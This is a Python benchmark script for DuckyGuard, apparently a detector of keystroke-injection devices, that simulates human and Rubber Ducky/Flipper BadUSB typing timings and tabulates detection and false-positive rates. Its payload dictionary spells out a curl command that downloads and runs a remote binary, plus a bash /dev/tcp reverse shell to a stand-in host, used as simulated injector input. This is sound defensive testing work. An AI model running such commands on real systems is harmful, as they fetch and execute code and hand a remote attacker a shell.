#!/usr/bin/env python3
"""
DuckyGuard simulation harness.

SIMULATION ONLY. Every number this script prints comes from synthetic keystroke
timestamps generated from published keystroke-dynamics ranges and from the
timing of scripted injectors. Nothing here is a hardware measurement.

    python3 bench/simulate.py            # prints Markdown tables for docs/EVALUATION.md
    python3 bench/simulate.py --seed 7 --n 2000

Human models (per-key inter-key interval, IKI, in seconds) are log-normal with
the mean / coefficient of variation taken from:
  * Dhakal et al., "Observations on Typing from 136 Million Keystrokes" (CHI 2018):
    average 52 WPM, mean IKI ~ 240 ms; fastest cohort ~ 120 WPM, IKI ~ 100 ms.
  * Killourhy & Maxion (DSN 2009) benchmark: down-down latencies 100-400 ms,
    hold times 60-150 ms, per-user CV ~ 0.3-0.7.
  * Competitive typists (public leaderboard bursts): ~ 200-220 WPM over 15 s,
    i.e. ~ 17 keys/s peak, IKI ~ 60 ms, CV still >= 0.25.

Injector models reproduce the timing of scripted keyboards:
  * Rubber Ducky / DuckyScript: ~ 8-20 ms per key (default), DEFAULT_DELAY variants.
  * Flipper Zero BadUSB: ~ 12-30 ms per key (captures/sample-flipper-attack.txt was
    produced at 12 ms by simulator.py; real Flipper firmware defaults are similar).
  * Evasion: evenly spaced 25-40 ms (the gap the 2026-10-26 claims audit found),
    and slow "human-speed" payloads at 80-120 ms per key.
"""

from __future__ import annotations

import argparse
import math
import os
import random
import statistics
import sys
import time
from dataclasses import dataclass
from typing import Callable, List, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "src"))

from duckyguard.detector import KeyEvent, KeystrokeAnomalyDetector  # noqa: E402

TEXT = ("the quick brown fox jumps over the lazy dog while a student writes a long answer "
        "about operating systems and keyboards without stopping to think ") * 3
PAYLOADS = {
    "curl_dropper": 'curl -sL -o /tmp/a "http://198.51.100.42/p/a.bin" && chmod +x /tmp/a && /tmp/a\n',
    "reverse_shell": "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1\n",
    "spotlight_terminal": "terminal\n" + "echo hi\n",
    "no_pattern_text": "hello world this is a plain sentence typed by a script\n",
}


@dataclass
class Profile:
    name: str
    group: str                      # "human" or "injector"
    iki: Callable[[random.Random], float]
    hold: Callable[[random.Random], float]
    length: int
    text: str = TEXT
    pauses: bool = False            # insert thinking pauses (> burst gap)
    note: str = ""


def lognormal(mean: float, cv: float) -> Callable[[random.Random], float]:
    sigma2 = math.log(1 + cv * cv)
    mu = math.log(mean) - sigma2 / 2
    s = math.sqrt(sigma2)
    return lambda r: r.lognormvariate(mu, s)


def uniform_ms(lo: float, hi: float) -> Callable[[random.Random], float]:
    return lambda r: r.uniform(lo, hi) / 1000.0


def fixed(ms: float, jitter_ms: float = 0.0) -> Callable[[random.Random], float]:
    return lambda r: max(0.0005, (ms + r.uniform(-jitter_ms, jitter_ms)) / 1000.0)


def human_profiles() -> List[Profile]:
    return [
        Profile("average typist 52 WPM", "human", lognormal(0.240, 0.55), lognormal(0.100, 0.30), 120, pauses=True,
                note="Dhakal 2018 mean"),
        Profile("fast typist 100 WPM", "human", lognormal(0.120, 0.45), lognormal(0.090, 0.30), 120, pauses=True),
        Profile("very fast typist 150 WPM", "human", lognormal(0.080, 0.35), lognormal(0.080, 0.30), 120),
        Profile("record burst 210 WPM", "human", lognormal(0.057, 0.28), lognormal(0.070, 0.30), 40,
                note="peak burst, CV from leaderboard replays"),
        Profile("key mashing (two-hand roll)", "human", uniform_ms(20, 90), lognormal(0.060, 0.40), 16,
                note="asdfjkl; rolls, high variance"),
        Profile("rhythmic gamer spam (WASD)", "human", lognormal(0.070, 0.22), lognormal(0.050, 0.35), 60),
        Profile("hunt and peck 25 WPM", "human", lognormal(0.480, 0.70), lognormal(0.120, 0.30), 80, pauses=True),
    ]


def injector_profiles() -> List[Profile]:
    return [
        Profile("Rubber Ducky default (~8 ms)", "injector", fixed(8, 1), fixed(2, 1), 60, PAYLOADS["curl_dropper"]),
        Profile("Flipper BadUSB 12 ms (captures/ sample)", "injector", fixed(12, 1), fixed(3, 1), 60, PAYLOADS["curl_dropper"]),
        Profile("Pico ducky 20 ms", "injector", fixed(20, 2), fixed(5, 2), 60, PAYLOADS["reverse_shell"]),
        Profile("evasion: even 30 ms, no pattern", "injector", fixed(30, 1), fixed(5, 1), 60, PAYLOADS["no_pattern_text"],
                note="claims-audit gap case"),
        Profile("evasion: even 40 ms, no pattern", "injector", fixed(40, 1), fixed(5, 1), 60, PAYLOADS["no_pattern_text"]),
        Profile("evasion: 60 ms +-3 ms jitter", "injector", fixed(60, 3), fixed(5, 1), 60, PAYLOADS["no_pattern_text"]),
        Profile("slow payload: even 100 ms", "injector", fixed(100, 1), fixed(5, 1), 60, PAYLOADS["no_pattern_text"],
                note="DEFAULT_DELAY 100; takes 6 s to type"),
        Profile("slow + randomised 80-120 ms", "injector", uniform_ms(80, 120), fixed(5, 1), 60, PAYLOADS["no_pattern_text"],
                note="randomised delays: expected miss"),
        Profile("Spotlight then Terminal, 15 ms", "injector", fixed(15, 1), fixed(3, 1), 40, PAYLOADS["spotlight_terminal"]),
    ]


def run_profile(p: Profile, rng: random.Random, usb_age: Optional[float] = None,
                with_holds: bool = True) -> Tuple[bool, Optional[int], Optional[float], Optional[dict]]:
    """Returns (blocked, key index at block, ms since first key at block, verdict dict)."""
    det = KeystrokeAnomalyDetector(usb_age_callback=(lambda: usb_age) if usb_age is not None else None)
    t = 0.0
    first = 0.0
    prev_hold = None
    text = p.text
    for i in range(p.length):
        ch = text[i % len(text)]
        ev = KeyEvent(timestamp=t, char=("\n" if ch == "\n" else ch), hold_time=prev_hold if with_holds else None)
        v = det.observe(ev)
        if v.block:
            return True, i + 1, (t - first) * 1000.0, v.as_dict()
        prev_hold = p.hold(rng)
        gap = p.iki(rng)
        if p.pauses and rng.random() < 0.04:
            gap += rng.uniform(0.5, 2.0)
        t += gap
    return False, None, None, None


def evaluate(n: int, seed: int) -> str:
    rng = random.Random(seed)
    out: List[str] = []
    out.append("### Human profiles (false-positive rate, simulation)\n")
    out.append("| profile | runs | blocked | FP rate | note |")
    out.append("|---|---:|---:|---:|---|")
    total_h = 0
    fp_h = 0
    for p in human_profiles():
        blocked = 0
        for _ in range(n):
            b, *_ = run_profile(p, rng)
            blocked += int(b)
        total_h += n
        fp_h += blocked
        out.append(f"| {p.name} | {n} | {blocked} | {blocked / n:.2%} | {p.note} |")
    out.append(f"| **all human** | {total_h} | {fp_h} | **{fp_h / total_h:.3%}** | |")

    out.append("\n### Injector profiles (detection, simulation)\n")
    out.append("| profile | runs | caught | rate | median keys before block | median ms before block | note |")
    out.append("|---|---:|---:|---:|---:|---:|---|")
    for p in injector_profiles():
        caught = 0
        keys: List[int] = []
        ms: List[float] = []
        for _ in range(n):
            b, k, m, _v = run_profile(p, rng)
            caught += int(b)
            if b:
                keys.append(k)
                ms.append(m)
        mk = f"{statistics.median(keys):.0f}" if keys else "-"
        mm = f"{statistics.median(ms):.0f}" if ms else "-"
        out.append(f"| {p.name} | {n} | {caught} | {caught / n:.0%} | {mk} | {mm} | {p.note} |")

    out.append("\n### Same injectors, no hold-time information (CGEvent key-down only)\n")
    out.append("| profile | caught | median keys before block |")
    out.append("|---|---:|---:|")
    for p in injector_profiles():
        caught = 0
        keys = []
        for _ in range(max(50, n // 10)):
            b, k, m, _v = run_profile(p, rng, with_holds=False)
            caught += int(b)
            if b:
                keys.append(k)
        mk = f"{statistics.median(keys):.0f}" if keys else "-"
        out.append(f"| {p.name} | {caught / max(50, n // 10):.0%} | {mk} |")

    out.append("\n### Humans right after plugging in an untrusted keyboard (hardest false-positive case)\n")
    out.append("| profile | runs | blocked | FP rate |")
    out.append("|---|---:|---:|---:|")
    for p in human_profiles():
        blocked = 0
        m = max(50, n // 10)
        for _ in range(m):
            b, *_ = run_profile(p, rng, usb_age=3.0)
            blocked += int(b)
        out.append(f"| {p.name} | {m} | {blocked} | {blocked / m:.2%} |")

    out.append("\n### Software-typed input (text expander, password manager, dictation, paste)\n")
    det = KeystrokeAnomalyDetector()
    blocked = 0
    for i in range(400):
        v = det.observe(KeyEvent(timestamp=i * 0.005, char="x", injected=True, source_pid=4242))
        blocked += int(v.block)
    out.append(f"400 keys at 5 ms from a process (pid set): blocked = {blocked}, kind = `{v.kind}`. "
               "Cmd+V paste is one key event and is never a burst.")
    det = KeystrokeAnomalyDetector()
    blocked = 0
    for i in range(400):
        v = det.observe(KeyEvent(timestamp=i * 0.030, char="x", repeat=(i > 0)))
        blocked += int(v.block)
    out.append(f"Key held down (auto-repeat at 30 ms x 400): blocked = {blocked}, kind = `{v.kind}`.")
    return "\n".join(out)


def latency_benchmark(n: int = 20000) -> str:
    """Per-key cost of KeystrokeAnomalyDetector.observe on this machine (code path only)."""
    det = KeystrokeAnomalyDetector()
    rng = random.Random(1)
    evs = []
    t = 0.0
    for i in range(n):
        t += rng.lognormvariate(math.log(0.12), 0.4)
        evs.append(KeyEvent(timestamp=t, char="a", hold_time=0.09))
    # warm up
    for ev in evs[:500]:
        det.observe(ev)
    det.reset()
    samples = []
    for ev in evs:
        t0 = time.perf_counter_ns()
        det.observe(ev)
        samples.append(time.perf_counter_ns() - t0)
    samples.sort()
    med = samples[len(samples) // 2] / 1000.0
    p99 = samples[int(len(samples) * 0.99)] / 1000.0
    mx = samples[-1] / 1000.0
    import platform
    return (f"`observe()` per key on {platform.machine()} / Python {platform.python_version()}: "
            f"median {med:.1f} us, p99 {p99:.1f} us, max {mx:.0f} us over {n} keys.")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=500)
    ap.add_argument("--seed", type=int, default=2026)
    ap.add_argument("--latency-only", action="store_true")
    args = ap.parse_args()
    if not args.latency_only:
        print(evaluate(args.n, args.seed))
        print()
    print("### Decision latency (measured, code path only)\n")
    print(latency_benchmark())


if __name__ == "__main__":
    main()
